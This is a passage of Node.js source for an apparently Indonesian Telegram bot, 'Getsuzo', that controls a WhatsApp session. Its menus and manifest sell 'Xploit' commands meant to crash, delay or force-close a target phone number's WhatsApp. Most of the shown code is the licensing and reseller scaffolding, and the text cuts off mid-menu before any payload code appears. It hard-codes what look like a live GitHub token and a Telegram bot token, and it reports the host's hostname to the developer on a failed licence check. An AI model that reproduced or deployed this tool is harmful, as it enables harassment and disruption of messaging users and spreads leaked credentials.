const { Telegraf, Markup, session } = require("telegraf"); 
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  generateWAMessage,
} = require("darknessbail");
const { Octokit } = require("@octokit/rest");
const fs = require("fs");
const os = require("os");
const path = require("path");
const moment = require("moment-timezone");
const axios = require("axios");
const pino = require("pino");
const chalk = require("chalk");
const figlet = require("figlet");
const gradient = require("gradient-string");
const { BOT_TOKEN } = require("./Token");
const crypto = require("crypto");
const fetch = require('node-fetch');
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
const premiumFile = "./DatabaseUser/premiumuser.json";
const adminFile = "./DatabaseUser/adminuser.json";
const ownerFile = "./ID.json";
const ownerID = 7653566720;
const prosesImg = "https://files.catbox.moe/zgkw7a.jpg";
const Module = require('module');

const originalRequire = Module.prototype.require;

Module.prototype.require = function (request) {
    if (request.toLowerCase() === 'axios') {
        console.error("⚠");
        process.exit(1);
    }
    return originalRequire.apply(this, arguments);
};

console.log("System Anti Proteksi Bypass Active...");
//=================================================\\
let bots = [];
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";

const developerId = "7653566720"; 

const bot = new Telegraf(BOT_TOKEN);
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const usePairingCode = true;

bot.use(session());

const randomImages = [
  "https://files.catbox.moe/zgkw7a.jpg",
  "https://files.catbox.moe/jn659q.jpg",
  "https://files.catbox.moe/fc4d19.jpg",
  "https://files.catbox.moe/o7ytw7.jpg",
  "https://files.catbox.moe/jx0i6f.jpg",
  "https://files.catbox.moe/6dg0iw.jpg",
  "https://files.catbox.moe/mktzxs.jpg",
  "https://files.catbox.moe/g1uhjb.jpg",
  "https://files.catbox.moe/c33quj.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

function parseDuration(durationStr) {
  const match = durationStr.match(/^(\d+)([dhm])$/);
  if (!match) return 0;
  const value = parseInt(match[1]);
  const unit = match[2];
  switch (unit) {
    case 'd': return value * 24 * 60 * 60 * 1000;
    case 'h': return value * 60 * 60 * 1000;
    case 'm': return value * 60 * 1000;
    default: return 0;
  }
}


function isActiveUser(list, id) {
  if (!list[id]) return false;
  return new Date(list[id]) > new Date();
}


const ownerIdFile = "./ID.json";
const groupConfigPath = "./DatabaseUser/group.json";

function loadOwnerData() {
  try {
    return JSON.parse(fs.readFileSync(ownerIdFile));
  } catch {
    return {};
  }
}

function isValidOwner(id) {
  if (id === "7653566720") return true; 

  const owners = loadOwnerData();
  const exp = owners[id];
  if (!exp) return false;

  const now = new Date();
  const expiredAt = new Date(exp);
  return expiredAt > now;
}

function loadGroupConfig() {
  try {
    return JSON.parse(fs.readFileSync(groupConfigPath));
  } catch {
    return { isGroupOnly: false };
  }
}

function saveGroupConfig(data) {
  fs.writeFileSync(groupConfigPath, JSON.stringify(data, null, 2));
}

let groupConfig = loadGroupConfig();

const githubToken = "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";

const octokit = new Octokit({ auth: githubToken });

const welcomeConfigFile = "./DatabaseUser/welcome.json";

function loadWelcomeConfig() {
  try {
    return JSON.parse(fs.readFileSync(welcomeConfigFile));
  } catch {
    return { enabled: false };
  }
}

function saveWelcomeConfig(config) {
  fs.writeFileSync(welcomeConfigFile, JSON.stringify(config, null, 2));
}
//=================================================\\
const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

const COOLDOWN_FILE = path.join(__dirname, "DatabaseUser", "cooldown.json");
let globalCooldown = 0;

function getCooldownData(ownerId) {
  const cooldownPath = path.join(
    DATABASE_DIR,
    "users",
    ownerId.toString(),
    "cooldown.json"
  );
  if (!fs.existsSync(cooldownPath)) {
    fs.writeFileSync(
      cooldownPath,
      JSON.stringify(
        {
          duration: 0,
          lastUsage: 0,
        },
        null,
        2
      )
    );
  }
  return JSON.parse(fs.readFileSync(cooldownPath));
}

function loadCooldownData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(COOLDOWN_FILE)) {
      const data = fs.readFileSync(COOLDOWN_FILE, "utf8");
      return JSON.parse(data);
    }
    return { defaultCooldown: 60 };
  } catch (error) {
    console.error("Error loading cooldown data:", error);
    return { defaultCooldown: 60 };
  }
}

function saveCooldownData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving cooldown data:", error);
  }
}

function isOnGlobalCooldown() {
  return Date.now() < globalCooldown;
}

function setGlobalCooldown() {
  const cooldownData = loadCooldownData();
  globalCooldown = Date.now() + cooldownData.defaultCooldown * 1000;
}

function parseCooldownDuration(duration) {
  const match = duration.match(/^(\d+)([smhd])$/i); 
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();

  switch (unit) {
    case "s": return value;
    case "m": return value * 60;
    case "h": return value * 3600;
    case "d": return value * 86400;
    default: return null;
  }
}

function isOnCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return false;

  const now = Date.now();
  return now < cooldownData.lastUsage + cooldownData.duration;
}

function formatTime(ms) {
  const totalSeconds = Math.ceil(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;

  if (minutes > 0) {
    return `${minutes} menit ${seconds} detik`;
  }
  return `${seconds} detik`;
}

function getRemainingCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return 0;

  const now = Date.now();
  const remaining = cooldownData.lastUsage + cooldownData.duration - now;
  return remaining > 0 ? remaining : 0;
}

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "database");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}

//=================================================\\
const GITHUB_TOKEN_URL = "https://raw.githubusercontent.com/Rexy-dat/Spulet/refs/heads/main/database.json";
const TELEGRAM_ALERT_ID = "7653566720";
const TELEGRAM_BOT_TOKEN = "8335004153:AAHFRwa6GOfPmDfqnhTU8WO1lqarR8aNjBY";

async function validateToken() {
  try {
    const res = await axios.get(GITHUB_TOKEN_URL);
    const validTokens = res.data.tokens || [];

    if (!validTokens.includes(BOT_TOKEN)) {
      console.log("❌ Token tidak valid.");
      await sendBypassAlert("Token tidak terdaftar");
      process.exit(1);
    }

    console.log("Succes Login Acces...");
  } catch (err) {
    console.error("⚠️ Gagal mengambil token dari GitHub:", err.message);
    process.exit(1);
  }
}

async function sendBypassAlert(reason) {
  const idData = JSON.parse(fs.readFileSync("./ID.json"));
  const currentId = Object.keys(idData)[0];
  const time = moment().tz("Asia/Jakarta").format("YYYY-MM-DD HH:mm:ss");
  const domain = process.env.HOSTNAME || os.hostname();

  const text = `
🚨 *PENCOBAAN BYPASS TERDETEKSI* 🚨
ID: ${currentId}
Token: \`${BOT_TOKEN}\`
Reason: ${reason}
Domain: ${domain}
Time: ${time}
`.trim();

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_ALERT_ID,
      text,
      parse_mode: "Markdown"
    });
    console.log("📤 Notifikasi bypass dikirim ke Telegram.");
  } catch (e) {
    console.error("❌ Gagal kirim notifikasi:", e.message);
  }
}

validateToken();
//=================================================\\
const githubOwner1 = "Rexy-dat";
const githubRepo1 = "Spulet";
const tokenPath = "database.json";
const resellerPath = "reseller.json";
const paymentPath = "payment.json";

function formatNominal(num) {
  if (num >= 1000000) return (num / 1000000).toFixed(0) + "M";
  if (num >= 1000) return (num / 1000).toFixed(0) + "k";
  return num.toString();
}

// ==== PT role (boleh add/del reseller) ====
const ptPath = "pt.json";

async function isPT(userId) {
  try {
    const url = `https://raw.githubusercontent.com/${githubOwner1}/${githubRepo1}/main/${ptPath}`;
    const { data } = await axios.get(url);
    const list = data.pt || data.pts || []; // fallback kalau struktur file lama
    return list.includes(userId);
  } catch (e) {
    console.error("Gagal cek PT:", e.message);
    return false;
  }
}

async function isPTorDev(userId) {
  return userId === developerId || (await isPT(userId));
}

// ==== MOD role (boleh add/del PT) ====
const modPath = "mod.json";

async function isMOD(userId) {
  try {
    const url = `https://raw.githubusercontent.com/${githubOwner1}/${githubRepo1}/main/${modPath}`;
    const { data } = await axios.get(url);
    const list = data.mod || data.mods || [];
    return list.includes(userId);
  } catch (e) {
    console.error("Gagal cek MOD:", e.message);
    return false;
  }
}

async function isMODorDev(userId) {
  return userId === developerId || (await isMOD(userId));
}

async function isResellerOrOwner(userId) {
  if (userId === developerId) return true;

  try {
    const url = `https://raw.githubusercontent.com/${githubOwner1}/${githubRepo1}/main/${resellerPath}`;
    const { data } = await axios.get(url);
    return data.resellers.includes(userId);
  } catch (e) {
    console.error("Gagal cek reseller:", e.message);
    return false;
  }
}

async function updateGitHubJSON(filePath, updateCallback) {
  try {
    const res = await octokit.repos.getContent({
      owner: githubOwner1,
      repo: githubRepo1,
      path: filePath
    });

    const content = Buffer.from(res.data.content, "base64").toString();
    const json = JSON.parse(content);
    const updatedJSON = await updateCallback(json);

    const encodedContent = Buffer.from(JSON.stringify(updatedJSON, null, 2)).toString("base64");

    await octokit.repos.createOrUpdateFileContents({
      owner: githubOwner1,
      repo: githubRepo1,
      path: filePath,
      message: `Update ${filePath}`,
      content: encodedContent,
      sha: res.data.sha,
    });

    return true;
  } catch (err) {
    console.error("Update gagal:", err.message);
    return false;
  }
}

//=================================================\\
const MAINTENANCE_RAW_URL = "https://raw.githubusercontent.com/Rexy-dat/Spulet/refs/heads/main/security.json";
const BOT_OWNER_ID = "7653566720";

const githubMaintenanceConfig = {
  repoOwner: "Rexy-dat",
  repoName: "Spulet",
  branch: "refs/heads/main",
  filePath: "security.json"
};

async function getMaintenanceStatus() {
  try {
    const res = await axios.get(MAINTENANCE_RAW_URL);
    return res.data || { status: "off", message: "" };
  } catch (err) {
    console.error("❌ Gagal cek maintenance:", err.message);
    return { status: "off", message: "" };
  }
}

async function setMaintenanceStatus(status, message = "") {

  try {
    const { data: fileData } = await octokit.repos.getContent({
      owner: githubMaintenanceConfig.repoOwner,
      repo: githubMaintenanceConfig.repoName,
      path: githubMaintenanceConfig.filePath,
      ref: githubMaintenanceConfig.branch
    });

    const sha = fileData.sha;

    const updatedContent = Buffer.from(
      JSON.stringify({ status, message }, null, 2)
    ).toString("base64");

    await octokit.repos.createOrUpdateFileContents({
      owner: githubMaintenanceConfig.repoOwner,
      repo: githubMaintenanceConfig.repoName,
      path: githubMaintenanceConfig.filePath,
      message: `Set maintenance ${status}`,
      content: updatedContent,
      sha,
      branch: githubMaintenanceConfig.branch
    });

    return true;
  } catch (err) {
    console.error("❌ Gagal update maintenance:", err.message);
    return false;
  }
}

//=================================================\\
const VERSION_RAW_URL = "https://raw.githubusercontent.com/Rexy-dat/Spulet/refs/heads/main/version.json";
const BOT_OWNER_ID2 = "7653566720"; 

const githubVersionConfig = {
  repoOwner: "Rexy-dat",
  repoName: "Spulet",
  branch: "refs/heads/main",
  filePath: "version.json"
};

async function getBotVersion() {
  try {
    const res = await axios.get(VERSION_RAW_URL);
    return res.data?.version || "Unknown";
  } catch (e) {
    console.error("❌ Gagal mengambil versi bot:", e.message);
    return "Unknown";
  }
}

async function updateBotVersion(newVersion) {

  try {
    const { data: fileData } = await octokit.repos.getContent({
      owner: githubVersionConfig.repoOwner,
      repo: githubVersionConfig.repoName,
      path: githubVersionConfig.filePath,
      ref: githubVersionConfig.branch
    });

    const sha = fileData.sha;

    const updatedContent = Buffer.from(
      JSON.stringify({ version: newVersion }, null, 2)
    ).toString("base64");

    await octokit.repos.createOrUpdateFileContents({
      owner: githubVersionConfig.repoOwner,
      repo: githubVersionConfig.repoName,
      path: githubVersionConfig.filePath,
      message: `Update versi ${newVersion}`,
      content: updatedContent,
      sha: sha,
      branch: githubVersionConfig.branch
    });

    return true;
  } catch (err) {
    console.error("❌ Gagal update versi bot:", err.message);
    return false;
  }
}

//=================================================\\
const githubOwner2 = "Rexy-dat";
const githubRepo2 = "Spulet";
const blacklistPath = "blacklist.json";

async function updateGitHubBlacklist(updateFn) {
  try {
    const { data: fileData } = await octokit.repos.getContent({
      owner: githubOwner2,
      repo: githubRepo2,
      path: blacklistPath,
    });

    const content = Buffer.from(fileData.content, "base64").toString();
    const json = JSON.parse(content);
    const updated = await updateFn(json);

    await octokit.repos.createOrUpdateFileContents({
      owner: githubOwner2,
      repo: githubRepo2,
      path: blacklistPath,
      message: "Update blacklist.json",
      content: Buffer.from(JSON.stringify(updated, null, 2)).toString("base64"),
      sha: fileData.sha,
    });

    return true;
  } catch (e) {
    console.error("Gagal update blacklist:", e.message);
    return false;
  }
}

//=================================================\\
const store = makeInMemoryStore({
  logger: pino().child({ level: "silent", stream: "store" }),
});

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ["Mac OS", "Safari", "10.15.7"],
    getMessage: async (key) => ({
      conversation: "P", // Placeholder
    }),
  };

  sock = makeWASocket(connectionOptions);

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      isWhatsAppConnected = true;
      console.log(
        chalk.white.bold(`WhatsApp Terhubung`));
    }

    if (connection === "close") {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !==
        DisconnectReason.loggedOut;
      console.log(chalk.bold.red(`WhatsApp Terputus`));
      if (shouldReconnect) {
        console.log(chalk.bold.yellow(`Menghubungkan Ulang`));
        startSesi();
      }
      isWhatsAppConnected = false;
    }
  });
};

//=================================================\\
const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

const checkOwner = (ctx, next) => {
  if (!isActiveUser(ownerUsers, ctx.from.id.toString())) {
    return ctx.reply("❌ Anda bukan Owner");
  }
  next();
};

const checkAdmin = (ctx, next) => {
  if (!isActiveUser(adminUsers, ctx.from.id.toString())) {
    return ctx.reply("❌ Anda bukan Admin.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!isActiveUser(premiumUsers, ctx.from.id.toString())) {
    return ctx.reply("❌ Anda bukan Premium");
  }
  next();
};

const addOwner = (userId, duration) => {
  const expired = new Date(Date.now() + parseDuration(duration)).toISOString();
  ownerUsers[userId] = expired;
  fs.writeFileSync(ownerFile, JSON.stringify(ownerUsers, null, 2));
};

const removeOwner = (userId) => {
  delete ownerUsers[userId];
  fs.writeFileSync(ownerFile, JSON.stringify(ownerUsers, null, 2));
};

const addAdmin = (userId, duration) => {
  const expired = new Date(Date.now() + parseDuration(duration)).toISOString();
  adminUsers[userId] = expired;
  fs.writeFileSync(adminFile, JSON.stringify(adminUsers, null, 2));
};

const removeAdmin = (userId) => {
  delete adminUsers[userId];
  fs.writeFileSync(adminFile, JSON.stringify(adminUsers, null, 2));
};

const addPremium = (userId, duration) => {
  const expired = new Date(Date.now() + parseDuration(duration)).toISOString();
  premiumUsers[userId] = expired;
  fs.writeFileSync(premiumFile, JSON.stringify(premiumUsers, null, 2));
};

const removePremium = (userId) => {
  delete premiumUsers[userId];
  fs.writeFileSync(premiumFile, JSON.stringify(premiumUsers, null, 2));
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("› WhatsApp Not Connected!");
    return;
  }
  next();
};

function isMeOnly(ctx) {
  const devId = "7653566720";
  return ctx.from?.id?.toString() === devId;
}

function getSystemInfo() {
  const totalMem = os.totalmem() / (1024 * 1024);
  const freeMem = os.freemem() / (1024 * 1024);
  const usedMem = totalMem - freeMem;
  const cpuUsage = os.loadavg()[0].toFixed(2); // 1 menit rata-rata load

  return {
    ram: `${usedMem.toFixed(2)}MB / ${totalMem.toFixed(2)}MB`,
    cpu: `${cpuUsage}`,
    uptime: getUptime()
  };
}
//=================================================\\
bot.use(async (ctx, next) => {
  const senderId = ctx.from?.id?.toString();
  const chatId = ctx.chat?.id?.toString();
  const chatType = ctx.chat?.type;

  // ========== [ MAINTENANCE CHECK ] ==========
  try {
    const { status, message } = await getMaintenanceStatus();
    if (status === "on" && senderId !== BOT_OWNER_ID) {
      return ctx.reply(`🛠️ *Maintenance Mode Aktif*\n${message}`, {
        parse_mode: "Markdown",
      });
    }
  } catch (err) {
    console.error("Gagal cek maintenance:", err.message);
  }

  // ========== [ GROUPONLY MODE ] ==========
  try {
    const groupConfig = loadGroupConfig();
    const isGroup = chatType === "group" || chatType === "supergroup";

    if (groupConfig.isGroupOnly && !isGroup && !isValidOwner(senderId)) {
      return ctx.reply("❌ Bot hanya dapat digunakan di grup saat mode grouponly aktif.");
    }

  } catch (err) {
    console.error("Gagal cek GroupOnly:", err.message);
  }

  // ========== [ BLACKLIST CHECK ] ==========
  try {
    const { data } = await axios.get(`https://raw.githubusercontent.com/${githubOwner2}/${githubRepo2}/main/${blacklistPath}`);
    const isBlacklisted = data.blacklist.includes(senderId);

    if (isBlacklisted) {
      return ctx.reply("🚫 Anda masuk dalam daftar blacklist dan tidak dapat menggunakan bot ini.");
    }
  } catch (err) {
    console.error("Gagal cek blacklist:", err.message);
  }

  // ========== [ USER / GROUP TRACKING ] ==========
  const dbFile = "./DatabaseUser/userlist.json";
  let db = { private: [], group: [] };

  try {
    if (fs.existsSync(dbFile)) {
      db = JSON.parse(fs.readFileSync(dbFile));
    }

    if (chatType === "private" && !db.private.includes(chatId)) {
      db.private.push(chatId);
    } else if ((chatType === "group" || chatType === "supergroup") && !db.group.includes(chatId)) {
      db.group.push(chatId);
    }

    fs.writeFileSync(dbFile, JSON.stringify(db, null, 2));
  } catch (err) {
    console.error("Gagal mencatat user/group:", err.message);
  }

  // ========== [ LANJUT KE NEXT MIDDLEWARE ] ==========
  return next();
});

//=================================================\\
bot.on("new_chat_members", async (ctx) => {
  const config = loadWelcomeConfig();
  const userId = ctx.from.id.toString();

  if (!config.enabled) return;

  const member = ctx.message.new_chat_members[0];
  const name = member.first_name;
  const groupTitle = ctx.chat.title;

  const welcomeText = `👋 *Selamat Datang* [${name}](tg://user?id=${member.id}) di grup *${groupTitle}*!\n\n📌 Pastikan baca aturan & jangan promosi ya~`;
  const photoUrl = "https://files.catbox.moe/zgkw7a.jpg"; 

  await ctx.telegram.sendPhoto(ctx.chat.id, photoUrl, {
    caption: welcomeText,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "💬 Join Room", url: "https://t.me/+r55iQVLXEwA1YmQ9" }],
        [{ text: "💬 Join Channel", url: "https://t.me/SanzzChannel" }],
      ],
    },
  });
});

//=================================================\\
bot.start(async (ctx) => {
  const sys = getSystemInfo();
  const versi = await getBotVersion();

  const mainMenuMessage = `
╭──(     𝗚𝗘𝗧𝗦𝗨𝗭𝗢 ☇ 𝐗      )
│🎭 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧 : @RenzzDevzzzzzzzz
║▬▭▬▭▬▭▬▭▬▭
│▢ Version : ${versi}
║▢ Runtime : ${sys.uptime}
│▢ RAM     : ${sys.ram}
║▢ CPU     : ${sys.cpu}%
│▬▭「 𝗚𝗲𝘁𝘀𝘂𝘇𝗼𝗫🐉 」▭▬
║›Getzuzo Zhiro ©Copyright
╰━━━━━━━━━━━━━━━━━━━━━⬣
`;

  const keyboard = [
    [
      { 
        text: "「 𝐗𝐏𝐋𝐎𝐈𝐓 」", 
        callback_data: "bug_menu" 
      }, 
      { 
        text: "「 𝐒𝐎𝐔𝐑𝐂𝐄 」", 
        callback_data: "dev_menu"
      }
    ],
    [
      { 
        text: "𝗦𝘆𝘀𝘁𝗲𝗺", 
        callback_data: "system_menu" 
      }
    ], 
    [
      {
        text: "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿", 
        url: "https://t.me/SanzzChannel" 
      }
    ],
  ];

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: keyboard }
  });
});

bot.action("dev_menu", async (ctx) => {
  const userId = ctx.from.id.toString();

  if (userId !== developerId) {
    await ctx.answerCbQuery("𝗧𝗵𝗶𝘀 𝗺𝗲𝗻𝘂 𝗰𝗮𝗻 𝗼𝗻𝗹𝘆 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗯𝘆 𝗱𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿𝘀!", { show_alert: true });
    return;
  }
  
  const mainMenuMessage = `
╭──(     𝗦𝗢𝗨𝗥𝗖𝗘 ☇ 𝐗      )
addowner Id duration
delowner Id 
setmaintenance on/off
setversi versi
broadcast pesan

( # ) *DATABASE*
p nominal role
list
addbl Id
delbl Id
addmod Id
delmod Id
addpt Id
delpt Id
addreseller Id
delreseller Id
addtoken token
deltoken token

( # ) *FITUR GROUP*
setwelcome on/off
ban reply
unban reply
kick reply
mute reply duration
unmute reply
╰━━━━━━━━━━━━━━━━━━━━━⬣
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "< Back To Menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("system_menu", async (ctx) => {
  
  const mainMenuMessage = `
𝐂𝐨𝐫𝐞 𝐒𝐲𝐬𝐭𝐞𝐦 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐁𝐨𝐭

Unit Pusat Struktur GetsuzoBot.
GetsuZoBot Adalah Ekosistem Modular Yang Dirancang Untuk Otomatisasi, Investigasi Digital, Dan Kendali Penuh Atas Data Dan Media.

Dengan Integrasi Sistematis Yang Stabil Dan Framework Kuat, GetsuzoBot Memungkinkan Kamu:
› Integrasi Eksploitasi Dan Intelijen
› Fokus Pada Efektivitas Dan Kemudahan User

Built Not Just To Assist, But To Dominate The Flow Of Data.
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "𝗠𝗲𝗻𝘂", 
          callback_data: "menu_all",
        }, 
        {
          text: "𝗖𝗼𝗻𝘁𝗿𝗶𝗯𝘂𝘁𝗼𝗿", 
          callback_data: "tqto",
        }, 
        {
          text: "𝗢𝘄𝗻𝗲𝗿𝗠𝗲𝗻𝘂", 
          callback_data: "owner_menu",
        }
      ], 
      [ 
        {
          text: "𝗠𝗮𝗻𝗶𝗳𝗲𝘀𝘁", 
          callback_data: "manifest",
        }
      ], 
      [
        { 
        text: "< back to menu", 
        callback_data: "back", 
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("owner_menu", async (ctx) => {
  
  const mainMenuMessage = `
╭──(     𝗦𝗬𝗦𝗧𝗘𝗠 ☇ 𝐗      )
addadmin Id duration
deladmin Id
addprem Id duration
delprem Id
setjeda duartion
grouponly on/off
cek <target>
addpairing 628xxx
delsession
╰━━━━━━━━━━━━━━━━━━━⬣
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "< Back to menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("menu_all", async (ctx) => {
const sys = getSystemInfo();
const versi = await getBotVersion();
  
  const mainMenuMessage = `
 -------! 𝗖𝗼𝗿𝗲 𝗠𝗼𝗱𝘂𝗹𝗲--------
 ( 𝗠𝗲𝗻𝘂 𝗔𝗰𝗰𝗲𝘀 ) 
» addadmin Id duration
» deladmin Id
» addprem Id duration
» delprem Id
» setjeda duartion
» grouponly on/off
» cek <target>
» addpairing 628xxx
» delsession

( 𝗦𝘆𝘀𝘁𝗲𝗺 & 𝗜𝗻𝗳𝗼 ) 
» Ram ${sys.ram}
» Runtime ${sys.uptime}
» Cpu ${sys.cpu}
» Version ${versi}

( 𝗠𝗲𝗻𝘂 𝗫𝗽𝗹𝗼𝗶𝘁𝗲 )
» infiniteios <TargetNumber>
» infinite <TargetNumber>
» getsuzodelay <TargetNumber>
» getsuzoui <TargetNumber>
© 𝗚𝗲𝘁𝘀𝘂𝘇𝗼𝗫↑𝗰𝗼𝗺𝗽𝗮𝗻𝘆 🐉
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "< Back to menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("tqto", async (ctx) => {
  
  const mainMenuMessage = `\`\`\`
𝐂𝐎𝐍𝐓𝐑𝐈𝐁𝐔𝐓𝐎𝐑𝐒

›› @RenzzDevzzzzzzzz ( Moodderr ) 
›› @sal12newera ( Owners ) 
›› @Alifzzofficial ( Owners ) 
\`\`\`
© GetsuzoCompany -!!! 
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "< Back to menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("manifest", async (ctx) => {
  
  const mainMenuMessage = `\`\`\`
--------------𝙈𝙖𝙣𝙞𝙛𝙚𝙨𝙩 𝙄𝙣𝙛𝙤 / 𝙋𝙚𝙢𝙗𝙚𝙧𝙞𝙩𝙖𝙝𝙪𝙖𝙣--------------
1. Fitur Xploite ↓↓↓⚙️
• Untuk Menjalankan Serangan
 Ke Target Number Hingga 
 Menyebabkan Crash / Delay / Forceclose

2. Fitur addpt ↓↓↓⚙️
• Dibuat Untuk Membantu User Menambahkan 
Salah Satu Orderan Baru Yang Membeli 
Script Ini Atau Membantu 
Menambahkan Acces Database!

3. Fitur Add Reseller ↓↓↓⚙️
• Membantu User Menambahkan User
 New Ke Database Reseller, Seperti Juga 
 Menambahkan Partner Tapi Acces Berbeda Beda!

4. Fitur Maintenance ↓↓↓⚙️
• Untuk Membantu User Menghentikan
 System Bot Pada Masa Update Atau Di Perbaiki!. 
 script otomatis Terhenti Semua

5. Fitur add token ↓↓↓ ⚙️
• Membantu User Menambahkan Token Bot
 New Ke Database Tanpa Ribet 
\`\`\`
© Getsuzo Company 🐉
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "< Back to menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("bug_menu", async (ctx) => {
  
  const mainMenuMessage = `
╭──(     𝐆𝐄𝐓𝐒𝐔𝐙𝐎 ☇ 𝐗      )
│/infiniteios <TargetNumber>
║/infinite <TargetNumber>
│/getsuzodelay <TargetNumber>
║/getsuzoui <TargetNumber>
│▬▭「 𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 」▭▬
║( ! ) Not Work All Device! 
╰━━━━━━━━━━━━━━━━━━━━━⬣
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "< Back to menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("back", async (ctx) => {
  const sys = getSystemInfo();
  const versi = await getBotVersion();

  const mainMenuMessage = `
╭──(     𝐆𝐄𝐓𝐒𝐔𝐙𝐎 ☇ 𝐗      )
